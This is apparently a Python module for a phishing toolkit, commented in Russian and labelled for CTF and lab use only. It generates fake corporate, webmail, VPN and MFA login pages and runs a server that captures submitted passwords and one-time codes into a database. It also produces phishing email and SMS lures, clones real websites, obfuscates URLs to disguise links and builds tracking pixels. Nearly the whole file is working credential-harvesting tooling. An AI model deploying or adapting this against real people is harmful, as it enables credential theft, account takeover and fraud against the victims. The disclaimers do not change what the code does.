"""
Social Engineering Toolkit (CTF / lab only).
Author: idqwixxa

Возможности:
    - Генератор обезличенных фишинг-страниц (Employee Portal, Webmail, VPN, MFA)
    - HTTP-сервер телеметрии: ловит клики, сабмиты форм, User-Agent, IP
    - QR-код генератор (ссылки, vCard, Wi-Fi, email)
    - Email-шаблоны (IT-helpdesk, password-reset, payroll, delivery)
    - SMS / WhatsApp шаблоны
    - Клонирование веб-страницы (для CTF: сохранить HTML/JS/CSS)
    - URL-обфускация (shortlink, punycode, @-trick, IP-decimal)
    - Tracking pixel

Все страницы — обезличенные, БЕЗ реальных брендов. Подставляй свои тексты
и используй только в своей лаборатории / с письменным разрешением.

⚠ Только для этичного использования и CTF / red team лаб.
"""
import asyncio
import html as html_mod
import json
import re
import socket
import threading
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, quote

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PHISH_DIR = REPORT_DIR / "phishing"
PHISH_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Обезличенные шаблоны (CTF-safe, без реальных брендов)
# ===========================================================================

PHISH_TEMPLATES = {
    "employee-portal": {
        "title": "Employee Portal — Sign in",
        "fields": ["email", "password"],
        "submit_text": "Sign in",
        "subtitle": "Corporate sign-in required",
    },
    "webmail": {
        "title": "Webmail Login",
        "fields": ["username", "password"],
        "submit_text": "Log in",
        "subtitle": "Mail service authentication",
    },
    "vpn-access": {
        "title": "VPN Access",
        "fields": ["username", "password", "otp"],
        "submit_text": "Connect",
        "subtitle": "Secure remote access",
    },
    "mfa-verify": {
        "title": "MFA Verification",
        "fields": ["code"],
        "submit_text": "Verify",
        "subtitle": "Two-factor authentication",
    },
    "password-reset": {
        "title": "Reset your password",
        "fields": ["email"],
        "submit_text": "Send reset link",
        "subtitle": "Enter your email to continue",
    },
    "sharepoint": {
        "title": "Document shared with you",
        "fields": ["email", "password"],
        "submit_text": "Open document",
        "subtitle": "You have a new shared file",
    },
    "delivery-notify": {
        "title": "Delivery notification",
        "fields": ["email", "password"],
        "submit_text": "Track package",
        "subtitle": "Your parcel is waiting",
    },
    "invoice-view": {
        "title": "Invoice #INV-2024-001",
        "fields": ["email", "password"],
        "submit_text": "View invoice",
        "subtitle": "Payment confirmation required",
    },
}


EMAIL_TEMPLATES = {
    "it-helpdesk": {
        "subject": "IT: Password expires today",
        "body": """Hi {name},

Your corporate password expires at the end of today. To avoid losing
access, please update it now via the self-service portal:

{link}

If you don't reset it, your account will be locked and IT will need to
intervene manually.

Regards,
IT Helpdesk
""",
    },
    "password-reset": {
        "subject": "Reset your password",
        "body": """Hello {name},

We received a request to reset your password. If this was you, click:

{link}

Link expires in 1 hour. If you didn't request it, ignore this email.

Security Team
""",
    },
    "payroll": {
        "subject": "Payroll update — action required",
        "body": """Hi {name},

Your salary will be updated next month. Please verify your bank
details via the secure portal:

{link}

Deadline: 24 hours.

HR Department
""",
    },
    "delivery": {
        "subject": "Your parcel could not be delivered",
        "body": """Dear {name},

Our courier tried to deliver your parcel but nobody was home. To
reschedule, please confirm your address:

{link}

Tracking: {tracking}

Courier Service
""",
    },
    "sharepoint": {
        "subject": "{sender} shared a document with you",
        "body": """Hi {name},

{sender} ({email}) shared "{doc_name}" with you via the corporate
document portal:

{link}

This link will expire in 7 days.

Document Portal
""",
    },
}


SMS_TEMPLATES = {
    "bank": "ALERT: Suspicious login detected on your account. Verify now: {link}",
    "delivery": "Your parcel is held. Confirm address: {link}",
    "mfa": "Your verification code: 482913. Do not share. If this wasn't you: {link}",
    "payroll": "HR: Update your payroll info today or salary will be delayed. {link}",
    "ceo": "Hi, this is {name}, need a quick favor. Reply ASAP — {link}",
}


# ===========================================================================
# Телеметрийный сервер
# ===========================================================================

@dataclass
class CaptureEvent:
    ts: str
    kind: str          # visit | submit | pixel
    ip: str
    ua: str
    path: str
    data: dict = None


PHISH_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
  * {{ box-sizing: border-box; }}
  body {{
    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
    background: #f4f6f8; margin: 0; min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
  }}
  .card {{
    background: #fff; border-radius: 8px; padding: 36px 32px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); width: 100%;
    max-width: 380px;
  }}
  h1 {{ font-size: 22px; margin: 0 0 6px; color: #1a1a1a; }}
  .sub {{ color: #666; font-size: 13px; margin-bottom: 24px; }}
  label {{ display: block; font-size: 12px; color: #444;
           margin-bottom: 6px; font-weight: 600; }}
  input {{
    width: 100%; padding: 10px 12px; border: 1px solid #d0d5dc;
    border-radius: 6px; font-size: 14px; margin-bottom: 14px;
    transition: border-color .15s;
  }}
  input:focus {{ outline: none; border-color: #0066cc; }}
  button {{
    width: 100%; padding: 11px; background: #0066cc; color: #fff;
    border: none; border-radius: 6px; font-size: 14px; font-weight: 600;
    cursor: pointer; margin-top: 4px;
  }}
  button:hover {{ background: #0052a3; }}
  .foot {{ text-align: center; color: #999; font-size: 11px;
           margin-top: 20px; }}
</style>
</head>
<body>
<form class="card" method="POST" action="/submit">
  <h1>{title}</h1>
  <div class="sub">{subtitle}</div>
  {fields}
  <button type="submit">{submit_text}</button>
  <div class="foot">Secure connection</div>
</form>
<script>
  fetch('/pixel', {{method: 'POST', body: JSON.stringify({{
    referer: document.referrer, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: screen.width + 'x' + screen.height, lang: navigator.language
  }})}});
</script>
</body>
</html>
"""


def _render_field(name: str) -> str:
    label = name.replace("_", " ").title()
    input_type = {
        "password": "password",
        "otp": "text",
        "code": "text",
        "email": "email",
    }.get(name, "text")
    maxlen = " maxlength=\"6\" inputmode=\"numeric\"" if name in ("otp", "code") else ""
    return (
        f'<label for="{name}">{label}</label>\n'
        f'<input type="{input_type}" name="{name}" id="{name}" '
        f'autocomplete="off"{maxlen} required>'
    )


class PhishServer:
    """Минималистичный HTTP-сервер для фишинг-страницы + телеметрии."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8000,
                 template: str = "employee-portal",
                 redirect_url: str = "https://example.com"):
        self.host = host
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.events: list[CaptureEvent] = []
        self.captured: list[dict] = []
        self._stop = asyncio.Event()
        self._server: asyncio.AbstractServer | None = None

    def _page(self) -> bytes:
        tpl = PHISH_TEMPLATES.get(self.template,
                                  PHISH_TEMPLATES["employee-portal"])
        fields_html = "\n  ".join(_render_field(f) for f in tpl["fields"])
        html_str = PHISH_HTML_TEMPLATE.format(
            title=html_mod.escape(tpl["title"]),
            subtitle=html_mod.escape(tpl["subtitle"]),
            fields=fields_html,
            submit_text=html_mod.escape(tpl["submit_text"]),
        )
        return html_str.encode("utf-8")

    async def _handle(self, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
        try:
            raw = b""
            while b"\r\n\r\n" not in raw:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
                if not chunk:
                    return
                raw += chunk
                if len(raw) > 128 * 1024:
                    break

            head, _, body = raw.partition(b"\r\n\r\n")
            lines = head.decode("iso-8859-1", errors="ignore").split("\r\n")
            if not lines:
                return
            method, path, _ = (lines[0] + " / HTTP/1.1").split(" ", 2)[:3]

            # Заголовки
            headers: dict[str, str] = {}
            for line in lines[1:]:
                if ":" in line:
                    k, _, v = line.partition(":")
                    headers[k.strip().lower()] = v.strip()

            # Читаем Content-Length
            cl = int(headers.get("content-length", "0") or 0)
            if cl > 0:
                while len(body) < cl:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
                    if not chunk:
                        break
                    body += chunk

            ip = writer.get_extra_info("peername")
            ip_str = ip[0] if ip else "?"
            ua = headers.get("user-agent", "")

            # Маршрутизация
            if path == "/" and method == "GET":
                await self._respond(writer, 200, "text/html", self._page())
                self._log_event("visit", ip_str, ua, path, {})

            elif path == "/submit" and method == "POST":
                data = self._parse_body(headers, body)
                # Маскируем пароль в консоли, но сохраняем
                safe_data = dict(data)
                if "password" in safe_data:
                    safe_data["password"] = "*" * len(safe_data["password"])
                console.print(
                    f"[bold green]🎣 CAPTURED[/bold green] "
                    f"[dim]{ip_str}[/dim] "
                    f"[cyan]{json.dumps(safe_data, ensure_ascii=False)}[/cyan]"
                )
                self._log_event("submit", ip_str, ua, path, data)
                self.captured.append({"ts": datetime.now().isoformat(),
                                      "ip": ip_str, "data": data})
                db.save_scan("phish_capture", self.template,
                             {"ip": ip_str, "data": data, "ua": ua[:200]})
                # Редирект
                loc = self.redirect_url
                resp = (
                    f"HTTP/1.1 302 Found\r\n"
                    f"Location: {loc}\r\n"
                    f"Content-Length: 0\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode()
                writer.write(resp)
                await writer.drain()

            elif path == "/pixel" and method == "POST":
                try:
                    px = json.loads(body.decode("utf-8", errors="ignore"))
                except Exception:
                    px = {"raw": body.decode("utf-8", errors="ignore")[:200]}
                self._log_event("pixel", ip_str, ua, path, px)

            else:
                await self._respond(writer, 404, "text/plain", b"not found")

        except Exception as exc:  # noqa: BLE001
            log.debug("phish handler: %s", exc)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:  # noqa: BLE001
                pass

    @staticmethod
    async def _respond(writer: asyncio.StreamWriter, code: int,
                       ctype: str, body: bytes) -> None:
        reason = {200: "OK", 302: "Found", 404: "Not Found"}.get(code, "OK")
        out = (
            f"HTTP/1.1 {code} {reason}\r\n"
            f"Content-Type: {ctype}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        writer.write(out)
        writer.write(body)
        await writer.drain()

    @staticmethod
    def _parse_body(headers: dict, body: bytes) -> dict:
        ctype = headers.get("content-type", "")
        text = body.decode("utf-8", errors="ignore")
        if "application/json" in ctype:
            try:
                return json.loads(text)
            except Exception:
                return {"raw": text[:500]}
        # form-urlencoded
        out = {}
        for pair in text.split("&"):
            if "=" in pair:
                k, _, v = pair.partition("=")
                from urllib.parse import unquote_plus
                out[unquote_plus(k)] = unquote_plus(v)
        return out

    def _log_event(self, kind: str, ip: str, ua: str,
                   path: str, data: dict) -> None:
        ev = CaptureEvent(
            ts=datetime.now().isoformat(timespec="seconds"),
            kind=kind, ip=ip, ua=ua, path=path, data=data or {},
        )
        self.events.append(ev)
        flag = {
            "visit": "[cyan]👁  visit [/cyan]",
            "submit": "[bold green]🎣 SUBMIT[/bold green]",
            "pixel": "[dim]·  pixel [/dim]",
        }.get(kind, f"[{kind}]")
        console.print(f"{flag} [white]{ip:<16}[/white] "
                      f"[dim]{path}[/dim]")

    async def run(self) -> None:
        self._stop = asyncio.Event()
        self._server = await asyncio.start_server(
            self._handle, self.host, self.port,
        )
        addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
        console.print(f"[green]✓ Phishing server: {addrs}[/green]")
        console.print(f"[cyan]  Template: {self.template}[/cyan]")
        console.print(f"[cyan]  Redirect: {self.redirect_url}[/cyan]")
        console.print("[yellow]  Ctrl+C для остановки.[/yellow]")
        async with self._server:
            await self._stop.wait()

    async def stop(self) -> None:
        self._stop.set()
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:  # noqa: BLE001
                pass


def run_phish_server(port: int = 8000, template: str = "employee-portal",
                     redirect_url: str = "https://example.com") -> None:
    srv = PhishServer(port=port, template=template, redirect_url=redirect_url)
    try:
        asyncio.run(srv.run())
    except KeyboardInterrupt:
        console.print("\n[yellow]Сервер остановлен.[/yellow]")
        try:
            asyncio.run(srv.stop())
        except Exception:
            pass
    finally:
        if srv.captured:
            console.print(f"\n[bold cyan]🎣 Захвачено форм: "
                          f"{len(srv.captured)}[/bold cyan]")
            for i, c in enumerate(srv.captured, 1):
                console.print(f"  [green]{i}.[/green] [{c['ts']}] "
                              f"{c['ip']} → {json.dumps(c['data'], ensure_ascii=False)}")


# ===========================================================================
# Генератор HTML страницы (в файл)
# ===========================================================================

def generate_phish_page(template: str, out_path: str | None = None) -> Path | None:
    if template not in PHISH_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(PHISH_TEMPLATES.keys())}[/dim]")
        return None
    tpl = PHISH_TEMPLATES[template]
    fields_html = "\n  ".join(_render_field(f) for f in tpl["fields"])
    html_str = PHISH_HTML_TEMPLATE.format(
        title=html_mod.escape(tpl["title"]),
        subtitle=html_mod.escape(tpl["subtitle"]),
        fields=fields_html,
        submit_text=html_mod.escape(tpl["submit_text"]),
    )
    if not out_path:
        out_path = str(PHISH_DIR / f"phish_{template}.html")
    try:
        Path(out_path).write_text(html_str, encoding="utf-8")
        console.print(f"[green]✓ Страница: {out_path}[/green]")
        db.save_scan("phish_gen", template, {"path": out_path})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def list_templates() -> None:
    table = Table(title=f"🎣 Обезличенные шаблоны ({len(PHISH_TEMPLATES)})")
    table.add_column("Slug", style="cyan")
    table.add_column("Title", style="white")
    table.add_column("Поля", style="green")
    for slug, tpl in PHISH_TEMPLATES.items():
        table.add_row(slug, tpl["title"], ", ".join(tpl["fields"]))
    console.print(table)

    t2 = Table(title=f"📧 Email-шаблоны ({len(EMAIL_TEMPLATES)})")
    t2.add_column("Slug", style="cyan")
    t2.add_column("Subject", style="white")
    for slug, tpl in EMAIL_TEMPLATES.items():
        t2.add_row(slug, tpl["subject"])
    console.print(t2)

    t3 = Table(title=f"📱 SMS-шаблоны ({len(SMS_TEMPLATES)})")
    t3.add_column("Slug", style="cyan")
    t3.add_column("Text", style="white")
    for slug, txt in SMS_TEMPLATES.items():
        t3.add_row(slug, txt)
    console.print(t3)


# ===========================================================================
# QR-код
# ===========================================================================

def _qrcode_available() -> bool:
    try:
        import qrcode  # noqa: F401
        return True
    except ImportError:
        return False


def generate_qr(data: str, out_path: str | None = None,
                size: int = 10, border: int = 2) -> Path | None:
    if not _qrcode_available():
        console.print("[red]qrcode не установлен.[/red]")
        console.print("[yellow]Установи: pip install qrcode[pil][/yellow]")
        return None
    try:
        import qrcode
        from qrcode.constants import ERROR_CORRECT_M
    except ImportError:
        console.print("[red]qrcode install failed.[/red]")
        return None

    qr = qrcode.QRCode(
        version=None,
        error_correction=ERROR_CORRECT_M,
        box_size=size,
        border=border,
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")

    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(PHISH_DIR / f"qr_{ts}.png")
    try:
        img.save(out_path)
        console.print(f"[green]✓ QR: {out_path}[/green]")
        db.save_scan("qr_code", data[:80], {"path": out_path})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def qr_menu() -> None:
    console.print("[cyan]Что закодировать?[/cyan]")
    console.print("  1. URL (ссылка)")
    console.print("  2. Текст")
    console.print("  3. Wi-Fi (SSID + password)")
    console.print("  4. vCard (контакт)")
    console.print("  5. Email (mailto)")
    c = Prompt.ask("Выбор", choices=["1", "2", "3", "4", "5"], default="1")

    if c == "1":
        url = Prompt.ask("URL")
        generate_qr(url)
    elif c == "2":
        txt = Prompt.ask("Текст")
        generate_qr(txt)
    elif c == "3":
        ssid = Prompt.ask("SSID")
        pwd = Prompt.ask("Пароль", password=True)
        enc = Prompt.ask("Шифрование", choices=["WPA", "WEP", "nopass"],
                         default="WPA")
        payload = f"WIFI:T:{enc};S:{ssid};P:{pwd};;"
        generate_qr(payload)
    elif c == "4":
        name = Prompt.ask("Имя")
        phone = Prompt.ask("Телефон", default="")
        email = Prompt.ask("Email", default="")
        org = Prompt.ask("Организация", default="")
        vcf = (
            "BEGIN:VCARD\nVERSION:3.0\n"
            f"FN:{name}\n"
            + (f"TEL:{phone}\n" if phone else "")
            + (f"EMAIL:{email}\n" if email else "")
            + (f"ORG:{org}\n" if org else "")
            + "END:VCARD"
        )
        generate_qr(vcf)
    elif c == "5":
        to = Prompt.ask("Email")
        subj = Prompt.ask("Subject", default="")
        body = Prompt.ask("Body", default="")
        payload = f"mailto:{to}?subject={quote(subj)}&body={quote(body)}"
        generate_qr(payload)


# ===========================================================================
# Email / SMS шаблоны
# ===========================================================================

def generate_email(template: str, out_path: str | None = None,
                   link: str = "https://example.com/login",
                   name: str = "John",
                   sender: str = "IT Support",
                   email: str = "it@example.com",
                   doc_name: str = "Q4-report.pdf",
                   tracking: str = "1Z999AA10123456784") -> Path | None:
    if template not in EMAIL_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(EMAIL_TEMPLATES.keys())}[/dim]")
        return None
    tpl = EMAIL_TEMPLATES[template]
    subject = tpl["subject"].format(sender=sender, name=name)
    body = tpl["body"].format(
        name=name, link=link, sender=sender, email=email,
        doc_name=doc_name, tracking=tracking,
    )
    text = (
        f"To: victim@example.com\n"
        f"Subject: {subject}\n"
        f"X-Priority: 3\n"
        f"MIME-Version: 1.0\n"
        f"Content-Type: text/plain; charset=UTF-8\n\n"
        f"{body}"
    )
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(PHISH_DIR / f"email_{template}_{ts}.eml")
    try:
        Path(out_path).write_text(text, encoding="utf-8")
        console.print(f"[green]✓ Email: {out_path}[/green]")
        console.print(f"[cyan]  Subject:[/cyan] {subject}")
        db.save_scan("se_email", template, {"path": out_path})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def generate_sms(template: str, link: str = "https://example.com",
                 name: str = "CEO") -> str:
    if template not in SMS_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(SMS_TEMPLATES.keys())}[/dim]")
        return ""
    txt = SMS_TEMPLATES[template].format(link=link, name=name)
    console.print(f"[cyan]{len(txt)} симв.[/cyan]")
    console.print(f"[green]{txt}[/green]")
    db.save_scan("se_sms", template, {"text": txt})
    return txt


# ===========================================================================
# Клонирование страницы (для CTF)
# ===========================================================================

def clone_page(url: str, out_dir: str | None = None) -> Path | None:
    """
    Сохранить HTML + инлайн-ресурсы страницы в локальную папку.
    Базовая версия: HTML + img/css/js по ссылкам → в подпапку assets/.
    """
    try:
        r = requests.get(url, timeout=15, verify=False, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyberSecToolkit/1.0"
        })
        r.raise_for_status()
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка загрузки: {exc}[/red]")
        return None

    if not out_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        host = urlparse(url).hostname or "site"
        out_dir = str(PHISH_DIR / f"clone_{host}_{ts}")

    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    assets = out / "assets"
    assets.mkdir(exist_ok=True)

    html_text = r.text

    # Скачиваем ресурсы (упрощённо — img/css/js)
    res_re = re.compile(
        r"""(?:src|href)\s*=\s*["']([^"']+\.(?:css|js|png|jpg|jpeg|gif|svg|woff2?|ttf))["']""",
        re.IGNORECASE,
    )
    seen: set[str] = set()
    count = 0
    for m in res_re.finditer(html_text):
        u = m.group(1)
        if u in seen or u.startswith("data:"):
            continue
        seen.add(u)
        # Абсолютный URL
        full = u if u.startswith("http") else (
            f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            + (u if u.startswith("/") else "/" + u)
        )
        fname = re.sub(r"[^A-Za-z0-9._-]", "_", u.split("/")[-1].split("?")[0])[:60]
        if not fname:
            continue
        try:
            rr = requests.get(full, timeout=10, verify=False, headers={
                "User-Agent": "Mozilla/5.0"
            })
            if rr.status_code == 200 and len(rr.content) < 5 * 1024 * 1024:
                (assets / fname).write_bytes(rr.content)
                html_text = html_text.replace(u, f"assets/{fname}")
                count += 1
        except Exception:
            continue

    index = out / "index.html"
    try:
        index.write_text(html_text, encoding="utf-8")
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка записи: {exc}[/red]")
        return None

    console.print(f"[green]✓ Клон: {index}[/green]")
    console.print(f"[dim]  Ресурсов скачано: {count}[/cyan]")
    db.save_scan("se_clone", url, {"path": str(out), "assets": count})
    return out


# ===========================================================================
# Обфускация URL
# ===========================================================================

def _ip_to_decimal(ip: str) -> str:
    try:
        parts = [int(p) for p in ip.split(".")]
        return str(
            (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
        )
    except Exception:
        return ip


def url_obfuscation(url: str) -> None:
    """Показать разные варианты маскировки URL."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    scheme = parsed.scheme or "http"

    table = Table(title=f"🎭 Обфускация: {url}")
    table.add_column("Тип", style="cyan")
    table.add_column("URL", style="green")

    # 1. Прямая
    table.add_row("direct", url)

    # 2. Punycode (для IDN)
    try:
        puny = host.encode("idna").decode()
        if puny != host:
            table.add_row("punycode", url.replace(host, puny))
    except Exception:
        pass

    # 3. Decimal IP
    try:
        socket.inet_aton(host)
        dec = _ip_to_decimal(host)
        table.add_row("decimal-ip", url.replace(host, dec))
    except Exception:
        pass

    # 4. Hex IP
    try:
        socket.inet_aton(host)
        parts = [f"0x{int(p):02x}" for p in host.split(".")]
        table.add_row("hex-ip", url.replace(host, ".".join(parts)))
    except Exception:
        pass

    # 5. @-trick (userinfo)
    if scheme in ("http", "https"):
        table.add_row("at-trick",
                      f"{scheme}://{host}@{host}{parsed.path or '/'}")

    # 6. \@ в пути
    table.add_row("backslash",
                  url.replace("//", "//", 1) + "/..\\")

    # 7. Double slash
    table.add_row("trailing-dot", url.replace(host, host + "."))

    # 8. Case-shuffle для path
    if parsed.path and parsed.path != "/":
        shuffled = "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(parsed.path)
        )
        table.add_row("case-shuffle", url.replace(parsed.path, shuffled))

    # 9. Percent-encode path
    if parsed.path and parsed.path != "/":
        enc = quote(parsed.path, safe="/")
        table.add_row("url-encoded-path", url.replace(parsed.path, enc))

    console.print(table)
    console.print("[dim]⚠ Все варианты — ТОЛЬКО для собственных CTF-задач.[/dim]")
    db.save_scan("se_url_obf", url[:60], {"variants": 9})


# ===========================================================================
# Tracking pixel
# ===========================================================================

def generate_tracking_pixel(server_url: str = "http://127.0.0.1:8000/pixel",
                            out_path: str | None = None) -> Path | None:
    """HTML-фрагмент с пикселем и скриптом-телеметрией."""
    html_snippet = f"""<img src="{server_url}" width="1" height="1" alt=""
     style="position:absolute;left:-9999px;">
<script>
fetch('{server_url}', {{
  method: 'POST',
  body: JSON.stringify({{
    referer: document.referrer,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height,
    ua: navigator.userAgent
  }})
}});
</script>
"""
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(PHISH_DIR / f"pixel_{ts}.html")
    try:
        Path(out_path).write_text(html_snippet, encoding="utf-8")
        console.print(f"[green]✓ Tracking pixel: {out_path}[/green]")
        db.save_scan("se_pixel", server_url, {"path": out_path})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🎭 Social Engineering Toolkit[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Список всех шаблонов"),
        ("2", "Сгенерировать HTML фишинг-страницы"),
        ("3", "Запустить телеметрийный сервер (ловит submit)"),
        ("4", "QR-код генератор (URL/Text/Wi-Fi/vCard/email)"),
        ("5", "Email шаблон (.eml)"),
        ("6", "SMS шаблон"),
        ("7", "Клонировать веб-страницу"),
        ("8", "Обфускация URL (для фишинга)"),
        ("9", "Tracking pixel"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для CTF / red team лабораторий "
                  "с письменным разрешением.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        list_templates()
    elif c == "2":
        tpl = Prompt.ask("Шаблон",
                         choices=list(PHISH_TEMPLATES.keys()),
                         default="employee-portal")
        out = Prompt.ask("Куда сохранить (Enter = авто)", default="").strip()
        generate_phish_page(tpl, out or None)
    elif c == "3":
        tpl = Prompt.ask("Шаблон",
                         choices=list(PHISH_TEMPLATES.keys()),
                         default="employee-portal")
        port = IntPrompt.ask("Порт", default=8000)
        redirect = Prompt.ask("Redirect URL после submit",
                              default="https://example.com")
        run_phish_server(port=port, template=tpl, redirect_url=redirect)
    elif c == "4":
        qr_menu()
    elif c == "5":
        tpl = Prompt.ask("Шаблон",
                         choices=list(EMAIL_TEMPLATES.keys()),
                         default="it-helpdesk")
        link = Prompt.ask("Ссылка", default="https://example.com/login")
        name = Prompt.ask("Имя получателя", default="John")
        generate_email(tpl, link=link, name=name)
    elif c == "6":
        tpl = Prompt.ask("Шаблон",
                         choices=list(SMS_TEMPLATES.keys()),
                         default="bank")
        link = Prompt.ask("Ссылка", default="https://example.com")
        generate_sms(tpl, link=link)
    elif c == "7":
        url = Prompt.ask("URL для клонирования")
        clone_page(url)
    elif c == "8":
        url = Prompt.ask("URL")
        url_obfuscation(url)
    elif c == "9":
        server = Prompt.ask("URL сервера телеметрии",
                            default="http://127.0.0.1:8000/pixel")
        generate_tracking_pixel(server)


# ===========================================================================
# CLI-обёртки
# ===========================================================================

def cli_templates() -> None:
    list_templates()


def cli_generate(template: str, out: str | None = None) -> None:
    generate_phish_page(template, out)


def cli_server(port: int = 8000, template: str = "employee-portal",
               redirect: str = "https://example.com") -> None:
    run_phish_server(port=port, template=template, redirect_url=redirect)


def cli_qr(data: str, out: str | None = None) -> None:
    generate_qr(data, out)


def cli_email(template: str, link: str = "https://example.com/login",
              name: str = "John", out: str | None = None) -> None:
    generate_email(template, out_path=out, link=link, name=name)


def cli_sms(template: str, link: str = "https://example.com") -> None:
    generate_sms(template, link=link)


def cli_clone(url: str, out: str | None = None) -> None:
    clone_page(url, out)


def cli_obfuscate(url: str) -> None:
    url_obfuscation(url)


def cli_pixel(server: str = "http://127.0.0.1:8000/pixel",
              out: str | None = None) -> None:
    generate_tracking_pixel(server, out)